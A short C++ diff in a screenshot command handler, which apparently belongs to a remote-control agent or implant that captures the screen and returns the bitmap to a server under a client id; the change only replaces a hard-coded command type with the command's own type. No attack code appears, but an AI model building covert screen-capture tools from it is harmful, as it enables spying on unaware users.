@@ -19,7 +19,7 @@ std::unique_ptr<IRequest> ScreenshotHandler::handle(std::shared_ptr<BasicCommand
 	return std::make_unique<ReturnProductRequest>(
 		RequestHeader{RequestType::ReturnProduct, m_client_id},
 		std::make_unique<ScreenshotProduct>(
-			command->get_command_id(), CommandType::Screenshot,
+			command->get_command_id(), command->get_command_type(),
 			std::move(bmp_buffer)
 		)
 	);
